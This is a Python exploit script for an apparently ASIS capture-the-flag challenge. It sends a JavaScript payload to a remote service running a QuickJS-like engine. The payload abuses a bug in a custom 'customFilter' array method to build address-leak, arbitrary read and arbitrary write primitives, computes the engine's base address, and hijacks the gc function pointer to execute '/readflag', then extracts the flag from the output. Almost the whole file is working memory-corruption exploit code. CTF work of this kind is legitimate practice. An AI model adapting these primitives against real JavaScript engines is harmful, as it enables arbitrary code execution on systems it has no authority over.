#!/usr/bin/env python3
import re
import socket
import sys

PAYLOAD = r'''
let keep=[];
function w32u(u8,o,v){for(let i=0;i<4;i++)u8[o+i]=(v>>(8*i))&255;}
function w64u(u8,o,v){for(let i=0;i<8;i++)u8[o+i]=Number((v>>(8n*BigInt(i)))&255n);}

function make_reader(){
  let a=['R'.repeat(31)];
  a.customFilter(()=>0);
  let b=new ArrayBuffer(72), u=new Uint8Array(b), d=new DataView(b);
  for(let i=0;i<72;i++)u[i]=0;
  d.setUint32(0,0x100000,true);
  d.setUint32(4,0x20000000,true);
  let x=a[0];
  keep.push(a,b,u,x);
  return {u,x};
}
let RD=make_reader();

function r8(p,o=0){
  w64u(RD.u,40,p);
  let c=RD.x[o];
  return c===undefined?0:c.charCodeAt(0);
}
function r64(p){
  let x=0n;
  for(let i=7;i>=0;i--)x=(x<<8n)+BigInt(r8(p,i));
  return x;
}

function addrof_keep(o){
  let a=['A'.repeat(23)];
  a.customFilter(()=>0);
  let h=[0x100,0,o,o];
  let x=a[0];
  keep.push(a,h,x);
  let p=0n;
  for(let i=5;i>=0;i--)p=(p<<8n)+BigInt(x[8+i].charCodeAt(0));
  return p;
}

function addrof_rel(o){
  let a=['B'.repeat(23)];
  a.customFilter(()=>0);
  let h=[0x100,0,o,o];
  let x=a[0];
  keep.push(a,x);
  let p=0n;
  for(let i=5;i>=0;i--)p=(p<<8n)+BigInt(x[8+i].charCodeAt(0));
  return p;
}

function data_addr(ab){
  let o=addrof_keep(ab);
  let s=r64(o+48n);
  return r64(s+16n);
}

function makeRW(addr){
  let sb=new ArrayBuffer(72), su=new Uint8Array(sb), sa=data_addr(sb);
  let victim=new ArrayBuffer(0x100), a=[13,victim];
  addrof_rel(victim);
  victim=null;
  gc();
  a.customFilter(()=>0);

  let fake=new ArrayBuffer(72), fu=new Uint8Array(fake);
  for(let i=0;i<72;i++)fu[i]=0;
  fu[18]=20; fu[19]=0;
  w64u(fu,48,sa);

  for(let i=0;i<72;i++)su[i]=0;
  w32u(su,0,0x1000);
  w32u(su,4,0x1000);
  w64u(su,16,addr);
  w64u(su,24,sa+24n);
  w64u(su,32,sa+24n);
  keep.push(sb,su,a,fake,fu);

  let rw=new Uint8Array(a[1]);
  keep.push(rw);
  return rw;
}

function write64(addr,val){
  let rw=makeRW(addr);
  w64u(rw,0,val);
}

let print_addr=addrof_keep(print);
let gc_addr=addrof_keep(gc);
let qjs_base=r64(print_addr+56n)-0x22dd8n;

write64(gc_addr+56n, qjs_base+0x20438n);
gc(['/readflag'], {block:true, stdout:1, stderr:1});

for(;;){}
'''.strip()

def recv_until(sock, needle=b'Send you script', timeout=5):
    sock.settimeout(timeout)
    data = b''
    while needle not in data:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data

def main():
    if len(sys.argv) != 3:
        print(f'Usage: python3 {sys.argv[0]} HOST PORT', file=sys.stderr)
        sys.exit(2)

    host, port = sys.argv[1], int(sys.argv[2])
    out = b''

    with socket.create_connection((host, port), timeout=10) as s:
        banner = recv_until(s)
        sys.stderr.write(banner.decode(errors='replace'))

        s.sendall(PAYLOAD.encode() + b'\n-- EOF --\n')

        s.settimeout(6)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()

    m = re.search(rb'ASIS\{[^}\r\n]+\}', out)
    if m:
        print('\n<FLAG>' + m.group(0).decode() + '</FLAG>')
    else:
        print('\n[!] Flag pattern not found. Raw output above.', file=sys.stderr)

if __name__ == '__main__':
    main()
